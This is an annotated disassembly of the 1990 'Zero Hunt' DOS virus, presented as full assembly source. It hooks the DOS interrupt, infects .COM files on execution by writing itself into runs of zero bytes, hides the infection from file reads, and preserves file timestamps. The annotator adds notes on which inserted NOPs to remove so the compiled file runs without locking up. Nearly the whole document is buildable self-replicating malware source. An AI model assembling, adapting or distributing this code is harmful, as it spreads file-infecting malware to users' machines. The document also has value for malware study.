PAGE  59,132

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                                                              ;;
;;;                 Zero Hunt Virus                              ;;
;;;                                                              ;;
;;;      Created:   29-Dec-90                                    ;;
;;;      Version:                                                ;;
;;;      Passes:    9          Analysis Options on: QRS          ;;
;;;                                                              ;;
;;;                                                              ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

data_1e     equ 0                       ; (0000:0000=588Fh)
data_3e     equ 2                       ; (0000:0002=248h)
data_4e     equ 84h                     ; (0000:0084=67h)
data_5e     equ 21Ch                    ; (0000:021C=0)
data_6e     equ 3BBh                    ; (0000:03BB=0)
data_7e     equ 3BDh                    ; (0000:03BD=0)
data_8e     equ 3BFh                    ; (0000:03BF=0)
data_9e     equ 413h                    ; (0000:0413=200h)
data_10e    equ 90h                     ; (77C7:0090=0)
data_20e    equ 3BFh                    ; (77C7:03BF=0)

seg_a       segment byte public
        assume  cs:seg_a, ds:seg_a


        org 100h

z_hunt      proc    far

start:
        cmc                             ; Complement carry - the F5h byte
                                        ;  that flags infected files.

        jmp     loc_2                   ; (0122)
        db      30 dup (0)

loc_2:                                  ;  xref 77C7:0101
        call    sub_1                   ; (0125)

z_hunt      endp

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;
;         Called from:   77C7:0122
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_1       proc    near
        pop     si
        mov     es,ax
        mov     di,data_5e              ; (0000:021C=0)
        cmp     byte ptr es:[di],0E8h
        je      loc_3                   ; Jump if equal
        mov     cx,19Fh
        sub     si,3
        rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
        push    es
        pop     ds
        mov     bx,data_4e              ; (0000:0084=67h)
        les     si,dword ptr [bx]       ; Load 32 bit ptr
        mov     word ptr [bx],2D5h
        mov     [bx+2],ax
        mov     ds:data_7e,es           ; (0000:03BD=0)
        mov     ds:data_6e,si           ; (0000:03BB=0)
        mov     al,40h                  ; '@'
        mov     bx,ds:data_9e           ; (0000:0413=200h)
        sub     bx,ax
        mul     bx                      ; dx:ax = reg * ax
        mov     ds:data_8e,ax           ; (0000:03BF=0)
        xor     ax,ax                   ; Zero register

loc_3:                                  ;  xref 77C7:012F
        push    cs
        push    cs
        pop     ds
        pop     es
        mov     word ptr ds:[100h],0C2E9h   ; (77C7:0100=0E9F5h)
        mov     word ptr ds:[102h],1    ; (77C7:0102=1Eh)
        jmp     loc_18                  ; (02C5)

loc_4:                                  ;  xref 77C7:01DE, 01E3
        pushf                           ; Push flags
        push    cs
        call    sub_3                   ; (02C0)
        pushf                           ; Push flags
        push    ax
        push    es
        push    bx
        push    ds
        mov     ah,2Fh                  ; '/'
        int     21h                     ; DOS Services  ah=function 2Fh
                                        ;  get DTA ptr into es:bx
        push    es
        pop     ds
        cmp     word ptr [bx],0E9F5h
        jne     loc_5                   ; Jump if not equal
        call    sub_2                   ; (01B7)

loc_5:                                  ;  xref 77C7:0185
        pop     ds
        pop     bx
        pop     es
        pop     ax
        jmp     short loc_8             ; (01AA)

loc_6:                                  ;  xref 77C7:01E8
        pushf                           ; Push flags
        push    cs
        call    sub_3                   ; (02C0)
        pushf                           ; Push flags
        jc      loc_8                   ; Jump if carry Set
        xchg    dx,bx
        cmp     word ptr [bx],0E9F5h
        jne     loc_7                   ; Jump if not equal
        cmp     [bx+2],ax
        jae     loc_7                   ; Jump if above or =
        call    sub_2                   ; (01B7)

loc_7:                                  ;  xref 77C7:019E, 01A3
        xchg    dx,bx

loc_8:                                  ;  xref 77C7:018E, 0196
        popf                            ; Pop flags
        push    bp
        push    ax
        pushf                           ; Push flags
        pop     ax
        mov     bp,sp
        mov     [bp+8],ax
        pop     ax
        pop     bp
        iret                            ; Interrupt return

;;;;; External Entry into Subroutine ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;
;         Called from:   77C7:0187, 01A5

sub_2:
        push    si
        mov     si,bx
        add     si,[bx+2]
        push    word ptr [si+48h]
        pop     word ptr [bx]
        push    word ptr [si+4Eh]
        pop     word ptr [bx+2]
        add     si,4
        push    ax
        push    cx
        mov     cx,19Fh
        xor     al,al                   ; Zero register

locloop_9:                              ;  xref 77C7:01D5
        mov     [si],al
        inc     si
        loop    locloop_9               ; Loop if cx > 0

        pop     cx
        pop     ax
        pop     si
        retn
        cmp     ah,21h                  ; '!'
        je      loc_4                   ; Jump if equal
        cmp     ah,27h                  ; '''
        je      loc_4                   ; Jump if equal
        cmp     ah,3Fh                  ; '?'
        je      loc_6                   ; Jump if equal
        cmp     ax,4B00h
        je      loc_10                  ; Jump if equal
        jmp     loc_17                  ; (02C0)

loc_10:                                 ;  xref 77C7:01ED
        push    es
        push    ax
        push    bx
        push    dx
        push    ds
        mov     ax,3D02h
        int     21h                     ; DOS Services  ah=function 3Dh
                                        ;  open file, al=mode,name@ds:dx
        xchg    ax,bx
        mov     ah,3Fh                  ; '?'
        xor     cx,cx                   ; Zero register
        mov     ds,cx
        inc     cx
        mov     dx,3C1h
        mov     si,dx
        pushf                           ; Push flags
        push    cs
        call    sub_3                   ; (02C0)
        cmp     byte ptr [si],0E9h
        je      loc_11                  ; Jump if equal
        jmp     loc_15                  ; (02AB)

loc_11:                                 ;  xref 77C7:0211
        mov     ax,4200h
        dec     cx
        xor     dx,dx                   ; Zero register
        int     21h                     ; DOS Services  ah=function 42h
                                        ;  move file ptr, cx,dx=offset
        pop     ds
        pop     dx
        push    dx
        push    ds
        push    bx
        push    cs
        pop     es
        mov     bx,data_20e             ; (77C7:03BF=0)
        mov     ax,4B03h
        int     21h                     ; DOS Services  ah=function 4Bh
                                        ;  run progm @ds:dx, parm @es:bx
        mov     ds,es:[bx]
        mov     cx,1A0h                 ; 416 bytes 
                                        ;  (Is this what threw you off?)
                                        ;  (Keep an open mind!)
        mov     dx,cx
        mov     bx,word ptr ds:data_1e+1    ; (0000:0001=4858h)
        mov     bp,bx
        xor     al,al                   ; Zero register

locloop_12:                             ;  xref 77C7:0248
        dec     bx
        pop     di
        jz      loc_14                  ; Jump if zero
        push    di
        cmp     [bx],al
        je      loc_13                  ; Jump if equal
        mov     cx,dx

loc_13:                                 ;  xref 77C7:0244
        loop    locloop_12              ; Loop if cx > 0

        mov     di,bp
        sub     di,bx
        sub     di,4Ch
        mov     word ptr cs:[269h],di   ; (77C7:0269=21Ch)
        push    word ptr ds:data_1e     ; (0000:0000=588Fh)

;       nop                             ;*ASM fixup - sign extn byte
                                        ;  (inserted by Sourcer)
;---------------------------------------------------------------;
;   This NOP, and the next one that Sourcer inserted, must be ;
;   removed, or commented out, in order for the compiled .COM ;
;   file to execute without locking up.                       ;
;---------------------------------------------------------------;

        pop     word ptr cs:[260h]      ; (77C7:0260=236h)
        push    word ptr ds:data_3e     ; (0000:0002=248h)
        pop     word ptr cs:[266h]      ; (77C7:0266=266h)
        mov     si,offset ds:[21Ch]     ; (77C7:021C=0CDh)
        mov     cx,dx
        dec     cx
        push    ds
        pop     es
        push    cs
        pop     ds
        mov     di,bx
        rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
        sub     bx,4
        mov     es:data_3e,bx           ; (0000:0002=248h)
        mov     word ptr es:data_1e,0E9F5h  ; (0000:0000=588Fh)

;       nop                             ;*ASM fixup - sign extn byte
                                        ; (inserted by Sourcer...)
                                        
        mov     di,0CFCFh
        lds     si,dword ptr ds:data_10e    ; (77C7:0090=0) Load 32 bit ptr
        xchg    di,[si]
        pop     bx
        mov     ax,5700h
        int     21h                     ; DOS Services  ah=function 57h
                                        ;  get/set file date & time
        push    cx
        push    dx
        push    es
        pop     ds
        mov     ah,40h                  ; '@'
        mov     cx,bp
        xor     dx,dx                   ; Zero register
        int     21h                     ; DOS Services  ah=function 40h
                                        ;  write file cx=bytes, to ds:dx
        pop     dx
        pop     cx
        mov     ax,5701h
        int     21h                     ; DOS Services  ah=function 57h
                                        ;  get/set file date & time
        xchg    di,bx

loc_14:                                 ;  xref 77C7:023F
        xchg    di,bx

loc_15:                                 ;  xref 77C7:0213
        mov     ah,3Eh                  ; '>'
        int     21h                     ; DOS Services  ah=function 3Eh
                                        ;  close file, bx=file handle
        lds     si,dword ptr cs:data_10e    ; (77C7:0090=0) Load 32 bit ptr
        cmp     byte ptr [si],0CFh
        jne     loc_16                  ; Jump if not equal
        xchg    di,[si]

loc_16:                                 ;  xref 77C7:02B7
        pop     ds
        pop     dx
        pop     bx
        pop     ax
        pop     es

;;;;; External Entry into Subroutine ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;
;         Called from:   77C7:0173, 0192, 020B

sub_3:
loc_17:                                 ;  xref 77C7:01EF

;*      jmp     far ptr loc_1           ;*(0000:0000)
        db      0EAh, 00h, 00h, 00h, 00h

loc_18:                                 ;  xref 77C7:016E
        mov     ah,4Ch                  ; 'L'
        mov     al,data_19              ; (77C7:030D=52h)
        int     21h                     ; DOS Services  ah=function 4Ch
                                        ;  terminate with al=return code

        db       90h, 90h, 90h, 90h, 90h

copyright   db  '(C)Copyright Microsoft Corp 1981'

        db  ',1987'
        db  11 dup (0)
        db  'Version 3.30'              ; from the 'bait' file

data_19 db  52h                         ;  xref 77C7:02C7 (R)
        db   57h, 48h                   ; (WH) - my initials from the
                                        ;  'bait' file.

sub_1       endp

seg_a       ends

        end start

;;;;;;;;;;;;;;;;;;;; CROSS REFERENCE - KEY ENTRY POINTS ;;;;;;;;;;;;;;;;;;;

    seg:off    type    label
   ---- ----   ----   ---------------
   77C7:0100   far    start

 ;;;;;;;;;;;;;;;;;; Interrupt Usage Synopsis ;;;;;;;;;;;;;;;;;;

        Interrupt 21h :  get DTA ptr into es:bx
        Interrupt 21h :  open file, al=mode,name@ds:dx
        Interrupt 21h :  close file, bx=file handle
        Interrupt 21h :  write file cx=bytes, to ds:dx
        Interrupt 21h :  move file ptr, cx,dx=offset
        Interrupt 21h :  run progm @ds:dx, parm @es:bx
        Interrupt 21h :  terminate with al=return code
        Interrupt 21h :  get/set file date & time

 ;;;;;;;;;;;;;;;;;; I/O Port Usage Synopsis  ;;;;;;;;;;;;;;;;;;

        No I/O ports used.
        